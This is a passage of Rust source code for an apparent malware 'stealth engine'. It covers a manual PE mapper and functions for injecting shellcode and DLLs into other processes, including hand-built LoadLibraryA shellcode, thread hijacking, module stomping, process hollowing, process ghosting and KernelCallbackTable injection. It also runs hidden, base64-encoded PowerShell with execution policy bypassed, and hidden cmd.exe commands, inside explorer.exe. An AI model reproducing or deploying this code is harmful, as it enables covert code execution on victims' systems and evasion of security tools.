                    let mut reloc_ptr = base_addr + reloc_dir_va as usize;
                    let end_reloc = reloc_ptr + reloc_dir_size as usize;
                    
                    while reloc_ptr < end_reloc {
                        let block_va = std::ptr::read_unaligned(reloc_ptr as *const u32);
                        let block_size = std::ptr::read_unaligned((reloc_ptr + 4) as *const u32);
                        if block_size == 0 { break; }
                        
                        let count = (block_size as usize - 8) / 2;
                        let page_addr = base_addr + block_va as usize;
                        let entries = (reloc_ptr + 8) as *const u16;
                        
                        for i in 0..count {
                            let entry = std::ptr::read_unaligned(entries.add(i));
                            let type_ = entry >> 12;
                            let offset = entry & 0xFFF;
                            
                            if type_ == 0x0A { 
                                let patch_addr = (page_addr + offset as usize) as *mut usize;
                                let current_val = std::ptr::read_unaligned(patch_addr);
                                std::ptr::write_unaligned(patch_addr, (current_val as isize + delta) as usize);
                            }
                        }
                        reloc_ptr += block_size as usize;
                    }
                }
            }
            
            // Resolve Imports
            let nt_headers_mapped = base_addr + lfanew;
            let import_dir_va = std::ptr::read_unaligned((nt_headers_mapped + 144) as *const u32);
            let import_dir_size = std::ptr::read_unaligned((nt_headers_mapped + 148) as *const u32);
            
            if import_dir_size > 0 {
                log_debug("Resolving Imports...");
                let mut desc_ptr = base_addr + import_dir_va as usize;
                
                while std::ptr::read_unaligned((desc_ptr + 12) as *const u32) != 0 {
                    let name_rva = std::ptr::read_unaligned((desc_ptr + 12) as *const u32);
                    let lib_name_ptr = (base_addr + name_rva as usize) as *const u8;
                    let h_lib = (api.load_lib)(lib_name_ptr);
                    
                    if !h_lib.is_invalid() {
                        let first_thunk_rva = std::ptr::read_unaligned((desc_ptr + 16) as *const u32);
                        let orig_thunk_rva = std::ptr::read_unaligned(desc_ptr as *const u32);
                        
                        let mut thunk = (base_addr + first_thunk_rva as usize) as *mut usize;
                        let mut orig_thunk = if orig_thunk_rva != 0 {
                             (base_addr + orig_thunk_rva as usize) as *const usize
                         } else {
                             thunk as *const usize
                         };
                         
                         while std::ptr::read_unaligned(orig_thunk) != 0 {
                             let val = std::ptr::read_unaligned(orig_thunk);
                             if (val & 0x8000000000000000) == 0 { 
                                 let import_by_name = (base_addr + (val & 0xFFFFFFFF) as usize) as *const u8;
                                 let func_name = import_by_name.add(2); 
                                 
                                 // Only log if func_addr == 0 to reduce spam, but let's log the attempt
                                 let func_addr = (api.get_proc)(h_lib, func_name);
                                 if func_addr != 0 {
                                     std::ptr::write_unaligned(thunk, func_addr);
                                 } else {
                                     if let Ok(name_str) = std::ffi::CStr::from_ptr(func_name as *const i8).to_str() {
                                         log_debug(&format!("  [!] FAILED to resolve import: {}", name_str));
                                     }
                                 }
                             } else {
                                 log_debug("  [!] WARNING: DLL contains import by ordinal. Not supported natively by this mapper.");
                             }
                             thunk = thunk.add(1);
                             orig_thunk = orig_thunk.add(1);
                         }
                    } else {
                        if let Ok(lib_str) = std::ffi::CStr::from_ptr(lib_name_ptr as *const i8).to_str() {
                            log_debug(&format!("  [!] FAILED to load library: {}", lib_str));
                        }
                    }
                    desc_ptr += 20;
                }
            }
            
            let entry_point_rva = std::ptr::read_unaligned((nt_headers_mapped + 40) as *const u32);
            let entry_point = base_addr + entry_point_rva as usize;
            log_debug(&format!("Calling DllMain at 0x{:x}...", entry_point));
            let dll_main: DllMainFn = mem::transmute(entry_point);
            let _ = dll_main(HINSTANCE(base_addr as *mut c_void), DLL_PROCESS_ATTACH, ptr::null_mut());
            
            log_debug("DllMain returned. load_image SUCCESS.");
            return Some(base_addr);
        }
    }

    // Helper to resolve exports
    unsafe fn get_proc_addr(&self, enc_name: &[u8]) -> Option<usize> {
        // Name is hashed with 0x66
        let name_bytes: Vec<u8> = enc_name.iter().map(|b| b ^ 0x66).collect();
        let name_cstring = CString::new(name_bytes).ok()?;
        
        let h_module = HMODULE(self.base_addr as *mut c_void);
        get_export_addr(h_module, name_cstring.as_ptr() as *const u8)
    }


    pub unsafe fn hollow_shellcode(&self, pid: u32, shellcode: &[u8]) -> anyhow::Result<()> {
        let h_stealth = (self.get_handle)(pid);
        if h_stealth.is_invalid() {
            return Err(anyhow::anyhow!("Failed to acquire stealth handle for PID: {}", pid));
        }

        log_debug(&format!("Injecting shellcode via NtCreateThreadEx ({} bytes)...", shellcode.len()));
        let success = (self.inject_shellcode)(h_stealth, shellcode.as_ptr() as *const _, shellcode.len());
        
        if !success {
             return Err(anyhow::anyhow!("Failed to inject shellcode via stealth engine"));
        }

        Ok(())
    }

    pub unsafe fn inject_dll(&self, pid: u32, dll_path: &str) -> anyhow::Result<()> {
        let h_kernel32 = windows::Win32::System::LibraryLoader::GetModuleHandleA(windows::core::s!("kernel32.dll"))?;
        let load_library_addr = windows::Win32::System::LibraryLoader::GetProcAddress(h_kernel32, windows::core::s!("LoadLibraryA"))
            .ok_or_else(|| anyhow::anyhow!("Failed to resolve LoadLibraryA"))? as u64;

        let path_bytes = format!("{}\0", dll_path).into_bytes();
        let h_stealth = (self.get_handle)(pid);
        
        // 1. Allocate for path
        let remote_path = (self.allocate)(h_stealth, path_bytes.len(), 0x04);
        (self.write)(h_stealth, remote_path, path_bytes.as_ptr() as *const _, path_bytes.len());

        // 2. Build Shellcode (Call LoadLibraryA)
        let mut sc = vec![
            0x48, 0x83, 0xEC, 0x28,                     // sub rsp, 40
            0x48, 0xB9, 0,0,0,0,0,0,0,0,                // mov rcx, remote_path
            0x48, 0xB8, 0,0,0,0,0,0,0,0,                // mov rax, load_library_addr
            0xFF, 0xD0,                                 // call rax
            0x48, 0x83, 0xC4, 0x28,                     // add rsp, 40
            0xC3                                        // ret
        ];
        sc[6..14].copy_from_slice(&(remote_path as u64).to_le_bytes());
        sc[16..24].copy_from_slice(&(load_library_addr as u64).to_le_bytes());

        self.hollow_shellcode(pid, &sc)
    }

    pub unsafe fn manual_map_dll_hijack(&self, pid: u32, dll_bytes: &[u8]) -> anyhow::Result<()> {
        let h_stealth = (self.get_handle)(pid);
        if h_stealth.is_invalid() {
            return Err(anyhow::anyhow!("Failed to acquire stealth handle for PID: {}", pid));
        }

        // 1. Perform Manual Mapping (Resolves relocs/IAT in target process memory)
        let entry_point = (self.manual_map)(h_stealth, dll_bytes.as_ptr() as *const _);
        if entry_point == 0 {
            return Err(anyhow::anyhow!("Stealth Manual Mapping failed"));
        }

        // 2. Hijack Thread to call EntryPoint
        let tid = self.find_first_thread(pid)?;
        
        let success = (self.hijack_thread)(tid, entry_point);
        if !success {
             return Err(anyhow::anyhow!("Failed to hijack thread {} for manual map execution", tid));
        }

        Ok(())
    }

    pub unsafe fn manual_map_dll_thread(&self, pid: u32, dll_bytes: &[u8]) -> anyhow::Result<()> {
        let h_stealth = (self.get_handle)(pid);
        if h_stealth.is_invalid() {
            return Err(anyhow::anyhow!("Failed to acquire stealth handle for PID: {}", pid));
        }

        // 1. Perform Manual Mapping
        let entry_point = (self.manual_map)(h_stealth, dll_bytes.as_ptr() as *const _);
        if entry_point == 0 {
            return Err(anyhow::anyhow!("Stealth Manual Mapping failed"));
        }

        // 2. Create New Thread to call EntryPoint
        let success = (self.create_thread)(h_stealth, entry_point);
        if !success {
             return Err(anyhow::anyhow!("Failed to create remote thread via NtCreateThreadEx"));
        }

        Ok(())
    }

    pub unsafe fn manual_map_dll(&self, pid: u32, dll_bytes: &[u8]) -> anyhow::Result<()> {
        // Choice: default to thread based as it is safer
        self.manual_map_dll_thread(pid, dll_bytes)
    }

    pub unsafe fn manual_map_dll_stomp(&self, pid: u32, dll_bytes: &[u8]) -> anyhow::Result<()> {
        let h_stealth = (self.get_handle)(pid);
        if h_stealth.is_invalid() {
            return Err(anyhow::anyhow!("Failed to acquire stealth handle for PID: {}", pid));
        }

        // 1. Perform Manual Mapping with Stomping
        let stub_entry = (self.manual_map_ex)(h_stealth, dll_bytes.as_ptr() as *const _, true);
        if stub_entry == 0 {
            return Err(anyhow::anyhow!("Stealth Manual Mapping (Stomp) failed"));
        }

        // 2. Create New Thread to call Stub
        let success = (self.create_thread)(h_stealth, stub_entry);
        if !success {
            return Err(anyhow::anyhow!("Failed to create remote thread via NtCreateThreadEx"));
        }

        Ok(())
    }

    pub unsafe fn spawn_hollow_process(&self, shellcode: &[u8], target_process: &str) -> anyhow::Result<HANDLE> {
        let tp_cstring = std::ffi::CString::new(target_process).unwrap();
        let h = (self.hollow_process)(shellcode.as_ptr() as *const c_void, shellcode.len(), tp_cstring.as_ptr());
        if h.is_invalid() {
            Err(anyhow::anyhow!("spawn_hollow_process failed"))
        } else {
            Ok(h)
        }
    }

    pub unsafe fn spawn_ghost_process(&self, shellcode: &[u8], target_process: &str) -> anyhow::Result<HANDLE> {
        let tp_cstring = std::ffi::CString::new(target_process).unwrap();
        let h = (self.ghost_process)(shellcode.as_ptr() as *const c_void, shellcode.len(), tp_cstring.as_ptr());
        if h.is_invalid() {
            Err(anyhow::anyhow!("spawn_ghost_process failed"))
        } else {
            Ok(h)
        }
    }

    pub unsafe fn spawn_stomp_process(&self, dll_bytes: &[u8], target_process: &str) -> anyhow::Result<HANDLE> {
        let tp_cstring = std::ffi::CString::new(target_process).unwrap();
        let h = (self.stomp_process)(dll_bytes.as_ptr() as *const c_void, dll_bytes.len(), tp_cstring.as_ptr());
        if h.is_invalid() {
            Err(anyhow::anyhow!("spawn_stomp_process failed"))
        } else {
            Ok(h)
        }
    }
pub unsafe fn find_first_thread(&self, pid: u32) -> anyhow::Result<u32> {
        let tid = (self.find_thread)(pid);
        if tid == 0 {
             return Err(anyhow::anyhow!("Failed to find valid thread for PID: {}", pid));
        }
        Ok(tid)
    }

    pub unsafe fn kct_inject(&self, pid: u32, index: i32, command: &str) -> anyhow::Result<()> {
        let h_stealth = (self.get_handle)(pid);
        if h_stealth.is_invalid() {
            return Err(anyhow::anyhow!("Failed to acquire stealth handle for PID: {}", pid));
        }
        let cmd_cstring = std::ffi::CString::new(command).unwrap();
        let success = (self.kct_inject)(h_stealth, index, cmd_cstring.as_ptr());
        
        if !success {
            return Err(anyhow::anyhow!("Failed to perform KCT Inject"));
        }
        Ok(())
    }

    pub unsafe fn kct_auto_inject(&self, pid: u32, command: &str) -> anyhow::Result<()> {
        let h_stealth = (self.get_handle)(pid);
        if h_stealth.is_invalid() {
            return Err(anyhow::anyhow!("Failed to acquire stealth handle for PID: {}", pid));
        }
        let cmd_cstring = std::ffi::CString::new(command).unwrap();
        let success = (self.kct_auto_inject)(h_stealth, cmd_cstring.as_ptr());
        
        if !success {
            return Err(anyhow::anyhow!("Failed to perform auto KCT Inject"));
        }
        Ok(())
    }

    pub fn execute_stealth_ps(&self, script: &str) -> anyhow::Result<()> {
        let mut utf16: Vec<u16> = script.encode_utf16().collect();
        // Base64 encode the UTF-16 bytes
        let utf8_bytes = unsafe { std::slice::from_raw_parts(utf16.as_ptr() as *const u8, utf16.len() * 2) };
        use base64::Engine;
        let b64 = base64::engine::general_purpose::STANDARD.encode(utf8_bytes);
        
        let cmd = format!("powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand {}", b64);
        
        let mut pid = 0;
        let mut sys = sysinfo::System::new_all();
        sys.refresh_processes();
        use sysinfo::{SystemExt, ProcessExt, PidExt};
        for (p, process) in sys.processes() {
            if process.name().to_lowercase() == "explorer.exe" {
                pid = p.as_u32();
                break;
            }
        }

        if pid == 0 {
            return Err(anyhow::anyhow!("Could not find explorer.exe for stealth execution"));
        }

        unsafe {
            self.kct_auto_inject(pid, &cmd)?;
        }
        Ok(())
    }

    pub fn execute_stealth_cmd_with_output(&self, cmd: &str) -> anyhow::Result<String> {
        let temp_file = std::env::temp_dir().join(format!("stealth_out_{}.txt", uuid::Uuid::new_v4()));
        let temp_path = temp_file.display().to_string();
        
        let batch_cmd = format!("cmd.exe /c {} > \"{}\" 2>&1", cmd, temp_path);
        
        let mut pid = 0;
        let mut sys = sysinfo::System::new_all();
        sys.refresh_processes();
        use sysinfo::{SystemExt, ProcessExt, PidExt};
        for (p, process) in sys.processes() {
            if process.name().to_lowercase() == "explorer.exe" {
                pid = p.as_u32();
                break;
            }
        }

        if pid == 0 {
            return Err(anyhow::anyhow!("Could not find explorer.exe for stealth execution"));
        }

        unsafe {
            self.kct_auto_inject(pid, &batch_cmd)?;
        }
        
        // Wait and poll for file
        let mut output = String::new();
        for _ in 0..50 { // Max 10 seconds timeout
            std::thread::sleep(std::time::Duration::from_millis(200));
            if temp_file.exists() && std::fs::File::open(&temp_file).is_ok() {
                if let Ok(content) = std::fs::read_to_string(&temp_file) {
                    if !content.is_empty() {
                        output = content;
                        let _ = std::fs::remove_file(&temp_file);
                        break;
                    }
                }
            }
        }
        
        let _ = std::fs::remove_file(&temp_file);
        
        if output.is_empty() {
            Ok("[Command executed with no output, or timed out]".to_string())
        } else {
            Ok(output.trim().to_string())
        }
    }
}

pub fn init_stealth_engine() -> bool {
    INIT.call_once(|| {
        unsafe {
            if let Some(engine) = StealthEngine::new() {
                INSTANCE = Some(engine);
            }
        }
    });

    unsafe { INSTANCE.is_some() }
}

pub fn get_engine() -> Option<&'static StealthEngine> {
    // Ensure initialized
    init_stealth_engine();
    unsafe { INSTANCE.as_ref() }
}
